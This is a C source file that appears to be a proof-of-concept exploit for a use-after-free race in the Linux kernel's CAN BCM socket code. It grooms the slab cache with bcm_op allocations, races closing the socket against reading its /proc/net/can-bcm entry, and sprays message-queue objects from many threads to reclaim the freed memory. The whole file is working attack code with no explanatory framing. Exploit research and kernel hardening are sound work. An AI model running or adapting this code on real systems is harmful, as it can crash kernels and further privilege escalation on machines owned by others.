#define _GNU_SOURCE        /* See feature_test_macros(7) */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <pthread.h>
#include <sys/socket.h>
#include <linux/can/bcm.h>
#include <sys/syscall.h>
#include <sys/msg.h>

/* Runtime configuration */

#define NR_SLABS 100
#define CACHE_OBJECTS 16
#define RX_ALLOC 0
#define TX_ALLOC CACHE_OBJECTS
#define CPU_TARGET 0
#define CPU_READ CPU_TARGET
#define CPU_SPARE 3
#define IVAL1_USEC 1000
#define IVAL2_USEC 1000

#define SIZE_TARGET 512

/* Definitions */

#define MAX_BCM_ID 1000
#define BCM_BUFFER 1024
#define BCM_ID_LENGTH 20
#define READ_THREADS 1
#define SPRAY_THREADS 35
#define IFINDEX 3
#define BUF_SIZE 1024

#define MAIN_BARRIERS (READ_THREADS + SPRAY_THREADS + 2)   	// READ_THREADS + SPRAY_THREADS + MAIN + close()
#define SPRAY_BARRIERS (SPRAY_THREADS + 1) 			// SPRAY_THREADS + MAIN
#define SPRAY_BARRIERS_2 (SPRAY_THREADS + READ_THREADS) 	// SPRAY_THREADS + READ_THREADS
#define THREAD_BARRIERS 3
pthread_barrier_t barrier[THREAD_BARRIERS];

struct can_msg{
	struct bcm_msg_head msg_head;
	struct can_frame frame[1];
};

struct list_head{
	unsigned long next;
	unsigned long prev;
} __attribute__((packed));

typedef unsigned char u8;
typedef unsigned int u32;
typedef long long s64;
typedef s64     ktime_t;

struct rb_node{
    unsigned long __rb_parent_color;
    struct rb_node *rb_right;
    struct rb_node *rb_left;
};

struct timerqueue_node{
    struct rb_node node;
    ktime_t expires;
};

struct hrtimer{
	struct timerqueue_node node;
	ktime_t _softexpires;
	enum hrtimer_restart (*function)(struct hrtimer *); 
	struct hrtimer_clock_base *base;
	u8 state;
	u8 is_rel;
	u8 is_soft;
	u8 is_hard;
	unsigned long rh_reserved1;
	unsigned long rh_reserved2;
};

struct bcm_op{
        struct list_head list;
        int ifindex;
        unsigned int can_id;
        unsigned int flags;
        unsigned long frames_abs;
        unsigned long frames_filtered;
        struct bcm_timeval ival1;
        struct bcm_timeval ival2;
        struct hrtimer timer;
        struct hrtimer thrtimer;
        ktime_t rx_stamp;
        ktime_t kt_ival1;
        ktime_t kt_ival2;
        ktime_t kt_lastmsg;
        int rx_ifindex;
        int cfsiz;
        u32 count;
        u32 nframes;
        u32 currframe;
        void *frames;
        void *last_frames;
        struct canfd_frame sframe;
        struct canfd_frame last_sframe;
        unsigned long *sk;
        unsigned long*rx_reg_dev;
};

struct bcm_op *bcm_op;

int can_sk;
int fd;
char files_found[MAX_BCM_ID][BCM_ID_LENGTH] = {{0}};

#define MSG_HEADER 0x30
#define STRUCT_LEN SIZE_TARGET  - MSG_HEADER

struct msg{
	long mtype;
	char mtext[STRUCT_LEN];
};

int msqid;

struct linux_dirent{
	unsigned long  d_ino;
	off_t          d_off;
	unsigned short d_reclen;
	char           d_name[];
};

unsigned int get_max_cpu_index(void){
        unsigned int max_cpu_index;

        if(CPU_TARGET > CPU_READ){

                max_cpu_index = CPU_TARGET;

        }else{

                max_cpu_index = CPU_READ;

        }

        if(max_cpu_index < CPU_SPARE){

                max_cpu_index = CPU_SPARE;

        }

return max_cpu_index;
}

int get_cpu(void){
	cpu_set_t cpuset;

	CPU_ZERO(&cpuset);

	if(sched_getaffinity(0, sizeof(cpuset), &cpuset) < 0){ 
		return -1; 
	}

return CPU_COUNT(&cpuset);
}

int set_cpu(unsigned int cpu){
	cpu_set_t cpuset;

	CPU_ZERO(&cpuset);
	CPU_SET(cpu, &cpuset);

	if(sched_setaffinity(0, sizeof(cpu_set_t), &cpuset) < 0){
		return -1;
	}

return 0;
}

int create_can_bcm_socket(void){
	int fd;

	if((fd = socket(AF_CAN, SOCK_DGRAM, CAN_BCM)) < 0){
		return -1;
	}

	return fd;
}

char *register_bcm_entries(int detect){
        struct linux_dirent *dirent = NULL;
        char *file = NULL;
        char dirent_s[1024];
        char d_type;
        int fd;
        int fd_can_bcm;
        unsigned int j = 0; 
        unsigned int l = 0; 
        int i = 0; 
        int ret = 0; 

        memset(&dirent_s,'\0', sizeof(dirent_s));

        fd = open("/proc/net/can-bcm/", O_RDONLY | O_DIRECTORY);
        if(fd < 0){

                fd_can_bcm = create_can_bcm_socket();
                if(fd_can_bcm < 0){
                        return (void *)-1;
                }

                close(fd_can_bcm);

                fd = open("/proc/net/can-bcm/", O_RDONLY | O_DIRECTORY);
                if(fd < 0){
                        return (void *)-1;
                }    
        }    

        for(;;){

                if((ret = syscall(SYS_getdents, fd, &dirent_s, sizeof(dirent_s))) < 0){  
                        close(fd);
                        return (void *)-1;
                }    

                if(ret == 0){  
                        close(fd);
                        return NULL;

                }

                for(i = 0; i < ret;){

                        dirent = (struct linux_dirent *) (dirent_s + i);  

                        d_type = *(dirent_s + i + dirent->d_reclen - 1);  
    
                        if(d_type == DT_REG){

                                if(j >= MAX_BCM_ID){

                                        close(fd);

                                        return (void *)-1;
     
                                }

                                if(strlen(dirent->d_name) > BCM_ID_LENGTH){

					close(fd);

					return (void *)-1;

                                }

                                if(detect == 1){

                                        for(l = 0; l < MAX_BCM_ID; l++){

                                                if(strcmp(files_found[l], dirent->d_name) == 0){

                                                        goto out; 

                                                }

                                        }

                                        file = strdup(dirent->d_name);
                                        close(fd);

                                        return file;

                                }else{

                                        memcpy(&files_found[j], dirent->d_name, strlen(dirent->d_name));
                                        j++;

                                }
                        }

                        out:

                        i += dirent->d_reclen;
                }

        }

}

/* Close thread */

void *race01(void *a){
	unsigned long error;

	#ifdef VERBOSE
		printf("[*] - Setting up CPU affinity race01 (close) thread\n");
	#endif

	if(set_cpu(CPU_TARGET) < 0){
		return (void *)-1;
	}

	pthread_barrier_wait(&barrier[0]);

	#ifdef VERBOSE
		printf("[*] - Closing socket (race02)\n");
	#endif

	error = close(can_sk);

return (void *)error;
}

/* Read thread */

void *race02(void *a){
	char bcm_buffer[BCM_BUFFER];
	long error;

	memset(&bcm_buffer, '\0', sizeof(bcm_buffer));

	#ifdef VERBOSE
		printf("[*] - Setting up CPU affinity race02 (read) thread\n");
	#endif

	if(set_cpu(CPU_READ) < 0){

		return (void *)-1;

	}
	
	pthread_barrier_wait(&barrier[0]);
	pthread_barrier_wait(&barrier[2]);

	#ifdef VERBOSE2 
		printf("[*] - Reading /proc/net/can-bcm/entry (race01)\n");
	#endif

	error = read(fd, &bcm_buffer, sizeof(bcm_buffer));

return (void *)error;
}

/* Spray threads */

void *initialize_reallocation(void *a){
	struct msg vmsg;
	long error;

	/* Initialize structures */

	memset(&vmsg,'\0', sizeof(vmsg));

	#ifdef VERBOSE2
		printf("[*] - Setting up CPU affinity spray threads to CPU %d\n", CPU_TARGET);
	#endif

	if(set_cpu(CPU_TARGET) < 0){

		return (void *)-1;

	}

	vmsg.mtype = 0x5152535455565758;
	memset(&vmsg.mtext,'Z', STRUCT_LEN);

	#ifdef VERBOSE2
		printf("[*] - Creating message ID\n");
	#endif

	if((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {

		return (void *)-1;

	}

	pthread_barrier_wait(&barrier[1]);
	pthread_barrier_wait(&barrier[0]);

	usleep(1000);

	pthread_barrier_wait(&barrier[2]);

	#ifdef VERBOSE2		
		printf("[*] - Reallocating...\n");
	#endif

	if((error = msgsnd(msqid, &vmsg, sizeof(vmsg.mtext), IPC_NOWAIT)) < 0){

		return (void *)-1;

	}

return (void *)error;
}

int initialize_barriers(void){

	if(pthread_barrier_init(&barrier[0], 0, MAIN_BARRIERS) < 0){

		return -1;

	}

	if(pthread_barrier_init(&barrier[1], 0, SPRAY_BARRIERS) < 0){

		return -1;

	}

	if(pthread_barrier_init(&barrier[2], 0, SPRAY_BARRIERS_2) < 0){

		return -1;

	}

return 0;
}

int main(void){
	pthread_t spray_threads[SPRAY_THREADS];
	pthread_t read_threads[READ_THREADS];
	pthread_t close_thread;
	struct sockaddr_can sockaddr_can;
	struct can_msg can_msg;
	struct msghdr msghdr;
	struct iovec iovec;
	char file_buffer[BUF_SIZE];
	char *can_bcm_entry;
	unsigned int max_cpu_index;
	int retval = -1;
	int error = -EXIT_FAILURE;
	int ncpus;
	int i, j, l;

	/* Initialize structures */

	memset(&sockaddr_can, '\0', sizeof(sockaddr_can));
	memset(&can_msg, '\0', sizeof(can_msg));
	memset(&msghdr, '\0', sizeof(msghdr));
	memset(&iovec, '\0', sizeof(iovec));

	/* Initialize char buffer */

	memset(&file_buffer, '\0', sizeof(file_buffer));

	#ifdef VERBOSE
		printf("[*] - Disabling stdout buffering\n");
	#endif

	setbuf(stdout, NULL);

	#ifdef VERBOSE
		printf("[*] - Checking number of CPUs available\n");
	#endif

        ncpus = get_cpu();
        max_cpu_index = get_max_cpu_index();
        if(ncpus < (max_cpu_index + 1)){

		#ifdef VERBOSE
			printf("[!] - Number of CPUs available below required\n");
		#endif

		exit(error);
	}

	#ifdef VERBOSE
		printf("[*] - CPUs available: %d\n", ncpus);
                printf("[*] - Validating structures sizeof(struct bcm_op) == %ld\n", sizeof(struct bcm_op));
        #endif

	if((sizeof(struct bcm_op) < 472) || (sizeof(struct bcm_op) > 512)){

		#ifdef VERBOSE
			printf("[*] - Structure bcm_op has a different size than expected\n");
		#endif

		exit(error);
	}

	if(initialize_barriers() < 0){

		#ifdef VERBOSE
			printf("[!] - Error while initializing barriers\n");
		#endif

		exit(error);
	}

	#ifdef VERBOSE
		printf("[*] - Setting up CPU affinity spare thread\n");
	#endif

	if(set_cpu(CPU_SPARE) < 0){

		#ifdef VERBOSE
			printf("[!] - Error while setting CPU affinity\n");
		#endif

		exit(error);
	}

	can_sk = socket(AF_CAN, SOCK_DGRAM, CAN_BCM);
	if(can_sk < 0 ){

		#ifdef VERBOSE
			printf("[!] - Error while creating a CAN BCM socket\n");
		#endif

		exit(error);
	}

	#ifdef VERBOSE
		printf("[*] - Socket created successfully\n");
	#endif

	sockaddr_can.can_ifindex = IFINDEX;
	
	if(connect(can_sk, (struct sockaddr *)&sockaddr_can, sizeof(sockaddr_can)) < 0){

		#ifdef VERBOSE
			printf("[!] - Error while connecting to the CAN BCM socket\n");
		#endif

		goto error_exit_1;
	}

	#ifdef VERBOSE
		printf("[*] - Socket connected successfully\n");
	#endif

	can_bcm_entry = register_bcm_entries(1);
	if(can_bcm_entry == NULL){

		#ifdef VERBOSE
			printf("[!] - Error while detecting our CAN BCM entry\n");
		#endif

		goto error_exit_1;
	}

	#ifdef VERBOSE
		printf("[*] - CAN BCM entry: %s\n", can_bcm_entry);
	#endif

	snprintf(file_buffer, sizeof(file_buffer) - 1, "/proc/net/can-bcm/%s", can_bcm_entry);

	free(can_bcm_entry);
	can_bcm_entry = NULL;

	fd = open(file_buffer, O_RDONLY);
	if(fd < 0){

		#ifdef VERBOSE
			printf("[!] - Error while opening %s\n", file_buffer);
		#endif

		goto error_exit_1;
	}


	msghdr.msg_name = NULL;
	msghdr.msg_namelen = 0;
	msghdr.msg_iov = &iovec;
	msghdr.msg_iovlen = 1;
	msghdr.msg_control = NULL;
	msghdr.msg_controllen = 0;

	iovec.iov_base = &can_msg;
	iovec.iov_len = sizeof(can_msg);

	can_msg.msg_head.flags = 0;
	can_msg.msg_head.nframes = 1;
	can_msg.msg_head.count = 0;
	can_msg.msg_head.ival1.tv_sec = 1;
	can_msg.msg_head.ival1.tv_usec = IVAL1_USEC;
	can_msg.msg_head.ival2.tv_sec = 1;
	can_msg.msg_head.ival2.tv_usec = IVAL2_USEC;

	for(i = 0; i < RX_ALLOC; i++){

		can_msg.msg_head.opcode  = RX_SETUP;
		can_msg.msg_head.can_id  = i;

		if(write(can_sk, &can_msg, sizeof(can_msg)) < 0){

			#ifdef VERBOSE
				printf("[!] - Error while sending message\n");
			#endif

			goto error_exit_2;
		}
	}

	#ifdef VERBOSE
		printf("[*] - Setting up CPU affinity main thread\n");
	#endif

	if(set_cpu(CPU_TARGET) < 0){

		#ifdef VERBOSE
			printf("[!] - Error while setting CPU affinity\n");
		#endif

		goto error_exit_2;
	}

	#ifdef VERBOSE
		printf("[*] - Preparing the cache\n");
		printf("[*] - Allocating %d objects\n", NR_SLABS * CACHE_OBJECTS);
	#endif

	l = 0;

	for(i = 0; i < NR_SLABS; i++){
		for(j = 0; j < CACHE_OBJECTS; j++){

			can_msg.msg_head.opcode = TX_SETUP;
			can_msg.msg_head.can_id = l++;

			if(sendmsg(can_sk, &msghdr, 0) < 0){

				#ifdef VERBOSE
					printf("[!] - Error while sending the messages\n");
				#endif

				goto error_exit_2;
			}
		}
	}

	#ifdef VERBOSE
		printf("[*] - Freeing %d object\n", CACHE_OBJECTS);
	#endif

	for(i = 0; i < CACHE_OBJECTS; i++){

		can_msg.msg_head.opcode = TX_DELETE;
		can_msg.msg_head.can_id = --l;

		if(sendmsg(can_sk, &msghdr, 0) < 0){

			#ifdef VERBOSE
				printf("[!] - Error while sending the messages\n");
			#endif

			goto error_exit_2;
		}
	}

	#ifdef VERBOSE
		printf("[*] - Allocating target object\n");
	#endif

	for(i = 0; i < TX_ALLOC; i++){

		can_msg.msg_head.opcode = TX_SETUP;
		can_msg.msg_head.can_id = l++;

		if(sendmsg(can_sk, &msghdr, 0) < 0){

			#ifdef VERBOSE
				printf("[!] - Error while sending the messages\n");
			#endif

			goto error_exit_2;
		}
	}

	#ifdef VERBOSE
		printf("[*] - Setting up CPU affinity spare thread CPU %d\n", CPU_SPARE);
	#endif

	if(set_cpu(CPU_SPARE) < 0){

		#ifdef VERBOSE
			printf("[!] - Error while setting CPU affinity\n");
		#endif

		goto error_exit_2;
	}

	#ifdef VERBOSE
		printf("[*] - Creating reallocation threads\n");
	#endif

	if(SPRAY_THREADS > 0){
		for(i = 0; i < SPRAY_THREADS; i++){
			if(pthread_create(&spray_threads[i], NULL, initialize_reallocation, NULL) < 0){

				#ifdef VERBOSE
					printf("[!] - Error while creating spray threads\n");
				#endif

				goto error_exit_2;
			}
		}
	}

	pthread_barrier_wait(&barrier[1]);

	#ifdef VERBOSE
		printf("[*] - Reallocation threads ready!\n");
		printf("[*] - Creating close thread\n");
	#endif

	if(pthread_create(&close_thread, NULL, &race01, NULL) < 0){

		#ifdef VERBOSE
			printf("[!] - Error while creating close thread\n");
		#endif

		goto error_exit_2;
	}

	#ifdef VERBOSE
		printf("[*] - Creating read threads\n");
	#endif

	if(READ_THREADS > 0){
		for(i = 0; i < READ_THREADS; i++){
			if(pthread_create(&read_threads[i], NULL, &race02, NULL) < 0){

				#ifdef VERBOSE
					printf("[!] - Error while creating read threads\n");
				#endif

				goto error_exit_2;
			}
		}
	}
	
	#ifdef VERBOSE
		printf("[*] - The race starts, releasing race barriers\n");
	#endif

	pthread_barrier_wait(&barrier[0]);

	#ifdef VERBOSE
		printf("[*] - Waiting...\n");
		printf("[*] - Finishing read threads\n");
	#endif

	if(READ_THREADS > 0){
		for(i = 0; i < READ_THREADS; i++){
			if(pthread_join(read_threads[i], (void *)&retval) < 0){

				#ifdef VERBOSE
					printf("[!] - Error while waiting for the read threads\n");
				#endif

			}else{
				if(retval != 0){

					#ifdef VERBOSE
						printf("[!] - Read thread %d returned error %d\n", i, retval);
					#endif

				}
			}
		}
	}

	#ifdef VERBOSE
		printf("[*] - Finishing spray threads\n");
	#endif

	if(SPRAY_THREADS > 0){
		for(i = 0; i < SPRAY_THREADS; i++){
			if(pthread_join(spray_threads[i], (void *)&retval) < 0){

				#ifdef VERBOSE
					printf("[!] - Error while waiting for the spray threads\n");
				#endif

			}else{
				if(retval != 0){

					#ifdef VERBOSE
						printf("[!] - Spray thread %d returned error %d\n", i, retval);
					#endif

				}
			}
		}
	}

	#ifdef VERBOSE
		printf("[*] - Finishing close thread\n");
	#endif

	if(pthread_join(close_thread, (void *)&retval) < 0){

		#ifdef VERBOSE
			printf("[!] - Error while waiting for the close thread\n");
		#endif

	}else{
		if(retval != 0){

			#ifdef VERBOSE
				printf("[!] - Close thread returned error %d\n", retval);
			#endif

		}
	}

	#ifdef VERBOSE
		printf("[*] - Exiting...\n");
	#endif

	error = EXIT_SUCCESS;

	error_exit_2:

		close(fd);

	error_exit_1:

		if(retval != 0){
			close(can_sk);
		}

return error;
}
